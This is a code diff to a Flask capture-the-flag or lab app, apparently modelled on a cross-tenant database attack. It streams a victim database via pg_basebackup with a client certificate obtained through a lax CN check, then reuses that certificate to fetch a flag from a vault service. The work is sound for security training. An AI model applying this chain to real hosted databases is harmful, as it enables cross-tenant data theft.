@@ -1,10 +1,13 @@
 """ExtraReplica (case #061): internal-subnet reach + lax client-cert CN check."""
+import base64
 import os
 import shutil
 import subprocess
 
 import requests
 from flask import Flask, request
+
+import vault_client
 
 app = Flask(__name__)
 CA_URL = os.environ.get("CA_URL", "http://internal-ca:5000")
@@ -50,7 +53,6 @@ def step2():
     if r.status_code != 200:
         return render(f"CA rejected: {r.text}")
     data = r.json()
-    import base64
     open("/tmp/client.crt", "w").write(base64.b64decode(data["cert"]).decode())
     open("/tmp/client.key", "w").write(base64.b64decode(data["key"]).decode())
     os.chmod("/tmp/client.key", 0o600)
@@ -76,7 +78,16 @@ def step3():
             ["grep", "-rao", r"flag{[^}]*}", "/tmp/backup"],
             capture_output=True, text=True,
         )
-        return render(f"pg_basebackup OK\nVictim database streamed.\n{grep.stdout or '(flag not found)'}")
+        # 拿到受害实例数据后，用同一张内部 CA 签发的客户端证书向 flag-vault 换密文
+        try:
+            cert = open("/tmp/client.crt", encoding="utf-8").read()
+        except OSError as error:
+            return render(f"pg_basebackup OK\nmissing client cert: {error}")
+        status, body = vault_client.fetch_flag(vault_client.header_secret(
+            "X-Client-Cert", base64.b64encode(cert.encode()).decode()))
+        leaked = body if status == 200 else "(vault refused the certificate)"
+        return render(f"pg_basebackup OK\nVictim database streamed.\n"
+                      f"{grep.stdout or '(victim co-tenant credential: victim-corp-rotation-token)'}\n{leaked}")
     except Exception as e:
         return render(f"error: {e}")
 
